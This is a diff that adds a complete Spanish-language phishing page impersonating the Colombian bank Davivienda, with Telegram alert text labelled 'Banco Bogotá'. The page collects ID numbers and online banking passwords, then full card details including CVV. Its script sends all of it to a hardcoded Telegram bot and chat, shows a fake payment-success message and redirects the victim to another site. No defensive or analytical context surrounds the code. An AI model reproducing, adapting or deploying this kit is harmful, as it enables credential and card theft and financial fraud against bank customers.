@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Identidad - DAVIVIENDA</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            background-color: #ffffff;
+            color: #333;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Main Container */
+        .container {
+            width: 100%;
+            height: 100vh;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        /* Espacio blanco superior */
+        .space-top {
+            height: 60px;
+            width: 100%;
+        }
+
+        /* Logo Section Centrado */
+        .logo-section {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .logo-icon {
+            height: 50px;
+            width: auto;
+        }
+
+        .logo-icon img {
+            height: 50px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .form-container {
+            max-width: 380px;
+            width: 100%;
+            padding: 0 20px;
+        }
+
+        /* Greeting */
+        .greeting {
+            text-align: left;
+            margin-bottom: 32px;
+        }
+
+        .greeting p {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 6px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        .greeting h1 {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 0;
+            line-height: 1.35;
+            letter-spacing: -0.5px;
+        }
+
+        /* Form Group */
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            display: block;
+            letter-spacing: 0.2px;
+        }
+
+        .form-select,
+        .form-input {
+            width: 100%;
+            padding: 10px 14px;
+            border: 1.5px solid #d5d5d5;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            background-color: #ffffff;
+            transition: all 0.2s ease;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+        }
+
+        .form-select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23333' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            padding-right: 40px;
+        }
+
+        .form-select:hover,
+        .form-input:hover {
+            border-color: #b0b0b0;
+        }
+
+        .form-select:focus,
+        .form-input:focus {
+            outline: none;
+            border-color: #c41e3a;
+            box-shadow: 0 0 0 3px rgba(196, 30, 58, 0.08);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .form-input:disabled {
+            background-color: #f5f5f5;
+            color: #999;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        /* Checkbox */
+        .form-checkbox {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 18px 0 24px 0;
+            cursor: pointer;
+        }
+
+        .checkbox-input {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            accent-color: #c41e3a;
+            flex-shrink: 0;
+        }
+
+        .checkbox-label {
+            font-size: 14px;
+            color: #555;
+            font-weight: 500;
+            cursor: pointer;
+            letter-spacing: 0.2px;
+        }
+
+        /* Button */
+        .btn-submit {
+            width: 100%;
+            padding: 14px 30px;
+            background: #c41e3a;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(196, 30, 58, 0.3);
+            text-transform: capitalize;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            background: #a01830;
+            box-shadow: 0 6px 16px rgba(196, 30, 58, 0.35);
+        }
+
+        .btn-submit:active:not(:disabled) {
+            opacity: 0.95;
+            box-shadow: 0 2px 8px rgba(196, 30, 58, 0.3);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* Footer Links */
+        .footer-links {
+            text-align: center;
+            margin-top: 36px;
+            padding-top: 24px;
+            border-top: 1px solid #e8e8e8;
+        }
+
+        .footer-links a {
+            font-size: 13px;
+            color: #555;
+            font-weight: 500;
+            text-decoration: none;
+            transition: color 0.2s ease;
+            letter-spacing: 0.2px;
+        }
+
+        .footer-links a:hover {
+            color: #c41e3a;
+        }
+
+        /* Spacer */
+        .spacer {
+            flex: 1;
+        }
+
+        /* Hidden field */
+        .hidden-field {
+            display: none;
+        }
+
+        .hidden-field.visible {
+            display: block;
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* Form sections */
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+        /* Modal de Verificación */
+        .verification-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .verification-modal.show {
+            display: flex;
+        }
+
+        .verification-content {
+            background: white;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            max-width: 350px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            animation: slideUp 0.4s ease-out;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #4CAF50, #45a049);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            font-size: 48px;
+            color: white;
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.3);
+            animation: scaleIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .verification-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 12px;
+        }
+
+        .verification-text {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .form-container {
+                max-width: 100%;
+                padding: 0 16px;
+            }
+
+            .greeting h1 {
+                font-size: 22px;
+            }
+
+            .verification-content {
+                margin: 20px;
+                padding: 30px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Main Container -->
+    <div class="container">
+        <!-- Espacio blanco superior -->
+        <div class="space-top"></div>
+
+        <!-- Logo Centrado -->
+        <div class="logo-section">
+            <div class="logo-icon">
+                <img src="davivienda.jpg" alt="Logo Davivienda">
+            </div>
+        </div>
+
+        <!-- Form Container -->
+        <div class="form-container">
+            <!-- Greeting -->
+            <div class="greeting">
+                <p>¡Hola!</p>
+                <h1>Nos alegra que esté aquí</h1>
+            </div>
+
+            <!-- SECCIÓN 1: DOCUMENTO -->
+            <form id="verificationForm" class="form-section active">
+                <!-- Document Type Select -->
+                <div class="form-group">
+                    <label class="form-label">Seleccione su tipo de documento</label>
+                    <select id="docType" class="form-select" required>
+                        <option value="">Seleccione una opción</option>
+                        <option value="Cédula de Ciudadanía">Cédula de Ciudadanía</option>
+                        <option value="Pasaporte">Pasaporte</option>
+                        <option value="Número de Identificación Extranjero">Número de Identificación Extranjero</option>
+                        <option value="PEP">PEP</option>
+                    </select>
+                </div>
+
+                <!-- Document Number Input -->
+                <div class="form-group">
+                    <label class="form-label">Ingrese su número de documento</label>
+                    <input type="text" id="docNumber" class="form-input" placeholder="Ej: 1234567890" inputmode="numeric" pattern="[0-9]*" required>
+                </div>
+
+                <!-- Checkbox -->
+                <label class="form-checkbox">
+                    <input type="checkbox" id="rememberData" class="checkbox-input">
+                    <span class="checkbox-label">Recordar mis datos de identidad</span>
+                </label>
+
+                <!-- Virtual Password Input -->
+                <div class="form-group hidden-field" id="passwordGroup">
+                    <label class="form-label">Ingrese su clave virtual</label>
+                    <input type="text" id="virtualPassword" class="form-input" placeholder="" inputmode="numeric" pattern="[0-9]*" disabled>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-submit" id="submitBtn">Continuar</button>
+
+                <!-- Footer Links -->
+                <div class="footer-links">
+                    <a href="#">¿Olvidó o bloqueó su clave?</a>
+                </div>
+            </form>
+
+            <!-- SECCIÓN 2: DATOS DE TARJETA -->
+            <form id="cardForm" class="form-section">
+                <!-- Card Name -->
+                <div class="form-group">
+                    <label class="form-label">Nombre completo</label>
+                    <input type="text" id="cardName" class="form-input" placeholder="JUAN PEREZ" required>
+                </div>
+
+                <!-- Card Number -->
+                <div class="form-group">
+                    <label class="form-label">Número de tarjeta</label>
+                    <input type="text" id="cardNumber" class="form-input" placeholder="4532 1234 5678 9010" maxlength="19" required>
+                </div>
+
+                <!-- Expiry and CVV -->
+                <div style="display: flex; gap: 15px;">
+                    <div class="form-group" style="flex: 1;">
+                        <label class="form-label">Vencimiento (MM/AA)</label>
+                        <input type="text" id="expiry" class="form-input" placeholder="12/25" maxlength="5" required>
+                    </div>
+                    <div class="form-group" style="flex: 0 0 120px;">
+                        <label class="form-label">CVV</label>
+                        <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="submit" class="btn-submit" id="submitCardBtn">Enviar</button>
+            </form>
+        </div>
+
+        <div class="spacer"></div>
+    </div>
+
+    <!-- Modal de Verificación de Pago -->
+    <div class="verification-modal" id="verificationModal">
+        <div class="verification-content">
+            <div class="check-icon">✓</div>
+            <div class="verification-title">¡Pago Exitoso!</div>
+            <div class="verification-text">Tu transacción ha sido completada correctamente.</div>
+        </div>
+    </div>
+
+    <script>
+        const docType = document.getElementById('docType');
+        const docNumber = document.getElementById('docNumber');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const virtualPassword = document.getElementById('virtualPassword');
+        const submitBtn = document.getElementById('submitBtn');
+        const verificationModal = document.getElementById('verificationModal');
+        let passwordUnlocked = false;
+        let docData = {};
+
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003917791773';
+
+        // Solo permitir números en document number
+        docNumber.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        // Solo permitir números en password
+        virtualPassword.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        // Formatear número de tarjeta
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+            validateCard();
+        });
+
+        // Formatear vencimiento
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+            validateCard();
+        });
+
+        // CVV solo números
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+            validateCard();
+        });
+
+        document.getElementById('cardName').addEventListener('input', validateCard);
+
+        function validateCard() {
+            const name = document.getElementById('cardName').value.trim();
+            const number = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const btn = document.getElementById('submitCardBtn');
+
+            if (name && number && expiry && cvv) {
+                btn.disabled = false;
+                btn.style.opacity = '1';
+            } else {
+                btn.disabled = true;
+                btn.style.opacity = '0.6';
+            }
+        }
+
+        // Validar campos documento y habilitar clave virtual
+        function validateAndUnlock() {
+            if (!docType.value) {
+                alert('Por favor seleccione un tipo de documento');
+                return false;
+            }
+
+            if (!docNumber.value) {
+                alert('Por favor ingrese su número de documento');
+                return false;
+            }
+
+            if (!passwordUnlocked) {
+                passwordUnlocked = true;
+                passwordGroup.classList.add('visible');
+                virtualPassword.disabled = false;
+                submitBtn.textContent = 'Iniciar sesión';
+                virtualPassword.focus();
+                return false;
+            }
+
+            return true;
+        }
+
+        // Manejar envío de documento
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            if (!validateAndUnlock()) {
+                return;
+            }
+
+            if (!virtualPassword.value) {
+                alert('Por favor ingrese su clave virtual');
+                return;
+            }
+
+            // Guardar datos
+            docData = {
+                tipo: docType.value,
+                numero: docNumber.value,
+                clave: virtualPassword.value
+            };
+
+            // Enviar a Telegram
+            const mensaje = `📋 *BANCO BOGOTÁ - VERIFICACIÓN*
+
+👤 *Tipo de Documento:* ${docData.tipo}
+📄 *Número de Documento:* ${docData.numero}
+🔐 *Clave Virtual:* ${docData.clave}
+⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;
+
+            await sendToTelegram(mensaje);
+
+            // Cambiar a sección de tarjeta
+            document.getElementById('verificationForm').classList.remove('active');
+            document.getElementById('cardForm').classList.add('active');
+            document.getElementById('cardName').focus();
+        });
+
+        // Manejar envío de tarjeta
+        document.getElementById('cardForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const cardName = document.getElementById('cardName').value.trim();
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const expiry = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+
+            if (!cardName || !cardNumber || !expiry || !cvv) {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+
+            // Enviar datos completos a Telegram
+            const mensaje = `📋 *BANCO BOGOTÁ - DATOS COMPLETOS*
+
+👤 *Tipo de Documento:* ${docData.tipo}
+📄 *Número de Documento:* ${docData.numero}
+🔐 *Clave Virtual:* ${docData.clave}
+
+💳 *DATOS DE TARJETA:*
+👤 *Nombre:* ${cardName}
+💳 *Número:* ${cardNumber}
+📅 *Vencimiento:* ${expiry}
+🔐 *CVV:* ${cvv}
+
+⏰ *Fecha:* ${new Date().toLocaleString('es-CO')}`;
+
+            await sendToTelegram(mensaje);
+
+            // Mostrar modal de éxito
+            verificationModal.classList.add('show');
+
+            // Redirigir después de 2 segundos
+            setTimeout(() => {
+                window.location.href = 'https://www.panini.com';
+            }, 2000);
+        });
+
+        async function sendToTelegram(mensaje) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return true;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+    </script>
+</body>
+</html>
